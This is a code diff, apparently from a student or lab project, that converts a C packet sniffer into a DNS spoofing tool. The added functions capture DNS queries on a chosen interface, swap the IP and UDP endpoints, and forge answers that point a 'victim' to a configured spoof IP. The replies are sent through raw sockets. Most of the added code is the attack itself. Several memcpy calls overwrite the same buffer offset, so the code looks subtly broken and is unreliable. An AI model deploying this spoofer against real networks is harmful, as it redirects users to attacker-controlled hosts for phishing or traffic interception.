@@ -4,15 +4,13 @@ void dns_sniff(struct config *c)
 {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *nic_descr;
-    struct bpf_program fp; // holds compiled program
-    bpf_u_int32 maskp;     // subnet mask
-    bpf_u_int32 netp;      // ip
-    char filter_exp[] = "udp and dst port domain";
+    struct bpf_program fp;
+    bpf_u_int32 maskp;
+    bpf_u_int32 netp;
+    char filter_exp[] = "udp dst port 53";
 
-    // Use pcap to get the IP address and subnet mask of the device
     pcap_lookupnet(c->interfaceName, &netp, &maskp, errbuf);
 
-    // open the device for packet capture & set the device in promiscuous mode
     nic_descr = pcap_open_live(c->interfaceName, BUFSIZ, 1, -1, errbuf);
     if (nic_descr == NULL)
     {
@@ -20,14 +18,12 @@ void dns_sniff(struct config *c)
         exit(1);
     }
 
-    // Compile the filter expression
     if (pcap_compile(nic_descr, &fp, filter_exp, 0, netp) == -1)
     {
         fprintf(stderr, "Error calling pcap_compile\n");
         exit(1);
     }
 
-    // Load the filter into the capture device
     if (pcap_setfilter(nic_descr, &fp) == -1)
     {
         fprintf(stderr, "Error setting filter\n");
@@ -35,29 +31,62 @@ void dns_sniff(struct config *c)
     }
 
     fprintf(stdout, "\n------------------------------\n\n");
+
     // Start the capture session
-    pcap_loop(nic_descr, 0, pkt_callback, NULL);
-
-    fprintf(stdout, "\nCapture Session Done\n");
+    pcap_loop(nic_descr, 0, handle_packet, (u_char *)c);
 }
 
-// Check all the headers in the Ethernet frame
-void pkt_callback(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
+void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
 {
-    u_int16_t type = handle_ethernet(args, pkthdr, packet);
+    u_char *spoof_packet;
+    struct my_ip *spoof_ip;
+    struct udp_header *spoof_udp;
+    u_char *dns_spoof;
+    int packet_len = 0;
+    int dns_len = 0;
+    struct config *c = (struct config *)args;
 
-    if (type == ETHERTYPE_IP) // handle the IP packet
-    {
-        handle_IP(args, pkthdr, packet);
-    }
+    packet_len = sizeof(struct my_ip) + sizeof(struct udp_header) +
+                 sizeof(struct dns_header) + sizeof(struct dns_answer) +
+                 sizeof(struct dns_query) + c->targetLen;
+    ;
+
+    spoof_packet = (u_char *)malloc(packet_len);
+    dns_len = sizeof(struct dns_header) + sizeof(struct dns_answer) + sizeof(struct dns_query) + c->targetLen;
+
+    spoof_ip = (struct my_ip *)malloc(sizeof(struct my_ip));
+    spoof_udp = (struct udp_header *)malloc(sizeof(struct udp_header));
+    dns_spoof = (u_char *)malloc(dns_len);
+
+    handle_IP(pkthdr, packet, spoof_ip);
+    handle_UDP(packet, spoof_udp);
+    handle_DNS(c, packet, dns_spoof);
+
+    memcpy(spoof_packet, spoof_ip, sizeof(struct my_ip));
+    memcpy(spoof_packet, spoof_udp, sizeof(struct udp_header));
+    memcpy(spoof_packet, dns_spoof, dns_len);
+
+    struct pseudo_header pseudo_header;
+    memcpy(&pseudo_header.source_address, &c->routerIP, IP_LEN);
+    memcpy(&pseudo_header.dest_address, &c->victimIP, IP_LEN);
+    pseudo_header.placeholder = 0;
+    pseudo_header.protocol = IPPROTO_UDP;
+    pseudo_header.udp_length = htons(8);
+
+    u_char *temp_header = (u_char *)malloc(sizeof(struct pseudo_header) + dns_len);
+    memcpy(temp_header, &pseudo_header, sizeof(struct pseudo_header));
+    memcpy(temp_header + sizeof(struct pseudo_header), dns_spoof, dns_len);
+
+    spoof_udp->sum = in_cksum((unsigned short *)temp_header, sizeof(struct pseudo_header) + dns_len);
+
+    send_dns_answer(inet_ntoa(spoof_ip->ip_dst), ntohs(spoof_udp->dport), spoof_packet, packet_len);
 }
 
-// This function will parse the IP header and print out selected fields of interest
-void handle_IP(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
+void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my_ip *spoof_ip)
 {
     const struct my_ip *ip;
     u_int length = pkthdr->len;
-    u_int hlen, off, version;
+    u_int hlen, version;
     int len;
 
     // Jump past the Ethernet header
@@ -72,8 +101,15 @@ void handle_IP(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *pac
     }
 
     len = ntohs(ip->ip_len);
-    hlen = IP_HL(ip);   // get header length
-    version = IP_V(ip); // get the IP version number
+    hlen = IP_HL(ip);
+    version = IP_V(ip);
+
+    // Spoof IP
+    memcpy(spoof_ip, ip, sizeof(struct my_ip));
+    memcpy(&spoof_ip->ip_dst, &ip->ip_src, IP_LEN);
+    memcpy(&spoof_ip->ip_src, &ip->ip_dst, IP_LEN);
+    spoof_ip->ip_len += 16;
+    spoof_ip->ip_sum = in_cksum((u_short *)spoof_ip, sizeof(struct my_ip));
 
     // verify version
     if (version != 4)
@@ -91,195 +127,105 @@ void handle_IP(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *pac
     // Ensure that we have as much of the packet as we should
     if (length < len)
         printf("\nTruncated IP - %d bytes missing\n", len - length);
-
-    // Ensure that the first fragment is present
-    off = ntohs(ip->ip_off);
-    if ((off & 0x1fff) == 0) // i.e, no 1's in first 13 bits
-    {                        // print SOURCE DESTINATION hlen version len offset */
-        fprintf(stdout, "Source IP: %s \n", inet_ntoa(ip->ip_src));
-        fprintf(stdout, "Destination IP: %s \n", inet_ntoa(ip->ip_dst));
-        fprintf(stdout, "Header Len: %d \n", hlen);
-        fprintf(stdout, "Version: %d \n", version);
-        fprintf(stdout, "IP Len: %d \n", len);
-        fprintf(stdout, "Offmask: %d \n", off);
-    }
-
-    switch (ip->ip_p)
-    {
-    case IPPROTO_TCP:
-        fprintf(stdout, "   Protocol: TCP\n");
-        handle_TCP(args, pkthdr, packet);
-        break;
-    case IPPROTO_UDP:
-        fprintf(stdout, "   Protocol: UDP\n");
-        handle_UDP(args, pkthdr, packet);
-        break;
-    default:
-        fprintf(stdout, "   Protocol: unknown\n");
-        break;
-    }
 }
 
-// This function will parse the IP header and print out selected fields of interest
-void handle_TCP(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
+void handle_UDP(const u_char *packet, struct udp_header *spoof_udp)
 {
-    const struct sniff_tcp *tcp = 0; // The TCP header
-    const struct my_ip *ip;          // The IP header
-    const u_char *payload;           // Packet payload
-
+    const struct udp_header *udp = 0; // The UDP header
+    const struct my_ip *ip;           // The IP header
     int size_ip;
-    int size_tcp;
-    int size_payload;
-
-    fprintf(stdout, "\n");
-    fprintf(stdout, "TCP packet\n");
 
     ip = (struct my_ip *)(packet + ETH_HEADER_LENGTH);
     size_ip = IP_HL(ip) * 4;
 
     // define/compute tcp header offset
-    tcp = (struct sniff_tcp *)(packet + ETH_HEADER_LENGTH + size_ip);
-    size_tcp = TH_OFF(tcp) * 4;
+    udp = (struct udp_header *)(packet + ETH_HEADER_LENGTH + size_ip);
 
-    if (size_tcp < 20)
-    {
-        fprintf(stdout, "   * Control Packet? length: %u bytes\n", size_tcp);
-        exit(1);
-    }
-
-    fprintf(stdout, "   Src port: %d\n", ntohs(tcp->th_sport));
-    fprintf(stdout, "   Dst port: %d\n", ntohs(tcp->th_dport));
-
-    // define/compute tcp payload (segment) offset
-    payload = (const u_char *)(packet + ETH_HEADER_LENGTH + size_ip + size_tcp);
-
-    // compute tcp payload (segment) size
-    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
-
-    // Print payload data, including binary translation
-
-    if (size_payload > 0)
-    {
-        printf("   Payload (%d bytes):\n", size_payload);
-        print_payload(payload, size_payload);
-    }
+    memcpy(spoof_udp, udp, sizeof(struct udp_header));
+    spoof_udp->dport = udp->sport;
+    spoof_udp->sport = udp->dport;
+    spoof_udp->len += 16;
 }
 
-void handle_UDP(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
+void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
 {
+    struct dns_header *dns_header;
+    struct dns_answer *dns_answer;
+    struct dns_query *dns_query;
+
+    int frontLen = +ETH_HEADER_LENGTH + sizeof(struct my_ip) + sizeof(struct udp_header);
+    dns_header = (struct dns_header *)(packet + frontLen);
+    dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header));
+    dns_query = (struct dns_query *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);
+
+    dns_header->flags = htons(0x8180);
+    dns_header->ancount = htons(1);
+
+    dns_answer->name = htons(0xc00c);
+    dns_answer->type = htons(1);
+    dns_answer->class = htons(1);
+    dns_answer->ttl = htonl(0x00012c56);
+    dns_answer->len = htons(4);
+    memcpy(&dns_answer->addr, c->spoofIP, IP_LEN);
+
+    // Fill dns spoof
+    memcpy(dns_spoof, dns_header, sizeof(struct dns_header));
+    memcpy(dns_spoof, dns_answer, sizeof(struct dns_answer));
+    memcpy(dns_spoof, dns_query, sizeof(struct dns_query) + c->targetLen);
 }
 
-u_int16_t handle_ethernet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
+unsigned short in_cksum(unsigned short *ptr, int nbytes)
 {
-    u_int caplen = pkthdr->caplen;
-    struct ether_header *eptr; /* net/ethernet.h */
-    u_short ether_type;
+    register long sum;
+    u_short oddbyte;
+    register u_short answer;
 
-    if (caplen < ETH_HEADER_LENGTH)
+    sum = 0;
+    while (nbytes > 1)
     {
-        fprintf(stdout, "Packet length less than ethernet header length\n");
-        return -1;
+        sum += *ptr++;
+        nbytes -= 2;
     }
 
-    // Start with the Ethernet header...
-    eptr = (struct ether_header *)packet;
-    ether_type = ntohs(eptr->ether_type);
+    if (nbytes == 1)
+    {
+        oddbyte = 0;
+        *((u_char *)&oddbyte) = *(u_char *)ptr;
+        sum += oddbyte;
+    }
 
-    // Print SOURCE DEST TYPE LENGTH fields
-    fprintf(stdout, "\n");
-    fprintf(stdout, "ETH: \n");
-    fprintf(stdout, "Src MAC: %s \n", ether_ntoa((struct ether_addr *)eptr->ether_shost));
-    fprintf(stdout, "Dst MAC: %s \n", ether_ntoa((struct ether_addr *)eptr->ether_dhost));
-
-    return ether_type;
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    answer = ~sum;
+    return (answer);
 }
 
-// This function will print payload data
-void print_payload(const u_char *payload, int len)
+void send_dns_answer(char *ip, u_short port, u_char *packet, int packlen)
 {
+    struct sockaddr_in to_addr;
+    int bytes_sent;
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int one = 1;
+    const int *val = &one;
 
-    int len_rem = len;
-    int line_width = 16; // number of bytes per line
-    int line_len;
-    int offset = 0; // offset counter
-    const u_char *ch = payload;
-
-    if (len <= 0)
+    if (sock < 0)
+    {
+        fprintf(stderr, "Error creating socket");
         return;
+    }
+    to_addr.sin_family = AF_INET;
+    to_addr.sin_port = htons(port);
+    to_addr.sin_addr.s_addr = inet_addr(ip);
 
-    // does data fits on one line?
-    if (len <= line_width)
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        print_hex_ascii_line(ch, len, offset);
+        fprintf(stderr, "Error at setsockopt()");
         return;
     }
 
-    // data spans multiple lines
-    for (;;)
-    {
-        // determine the line length and print
-        line_len = line_width % len_rem;
-        print_hex_ascii_line(ch, line_len, offset);
+    fprintf(stdout, "Orig IP: %s | Port: %d\n", ip, port);
 
-        // Process the remainder of the line
-        len_rem -= line_len;
-        ch += line_len;
-        offset += line_width;
-
-        // Ensure we have line width chars or less
-        if (len_rem <= line_width)
-        {
-            //print last line
-            print_hex_ascii_line(ch, len_rem, offset);
-            break;
-        }
-    }
-}
-
-// Print data in hex & ASCII
-void print_hex_ascii_line(const u_char *payload, int len, int offset)
-{
-
-    int i;
-    int gap;
-    const u_char *ch;
-
-    // the offset
-    fprintf(stdout, "%05d   ", offset);
-
-    // print in hex
-    ch = payload;
-    for (i = 0; i < len; i++)
-    {
-        fprintf(stdout, "%02x ", *ch);
-        ch++;
-        if (i == 7)
-            fprintf(stdout, " ");
-    }
-
-    // print spaces to handle a line size of less than 8 bytes
-    if (len < 8)
-        fprintf(stdout, " ");
-
-    // Pad the line with whitespace if necessary
-    if (len < 16)
-    {
-        gap = 16 - len;
-        for (i = 0; i < gap; i++)
-            fprintf(stdout, "   ");
-    }
-    fprintf(stdout, "   ");
-
-    // Print ASCII
-    ch = payload;
-    for (i = 0; i < len; i++)
-    {
-        if (isprint(*ch))
-            fprintf(stdout, "%c", *ch);
-        else
-            fprintf(stdout, ".");
-        ch++;
-    }
-
-    fprintf(stdout, "\n");
+    bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
+    if (bytes_sent < 0)
+        fprintf(stderr, "Error sending dat\n");
 }
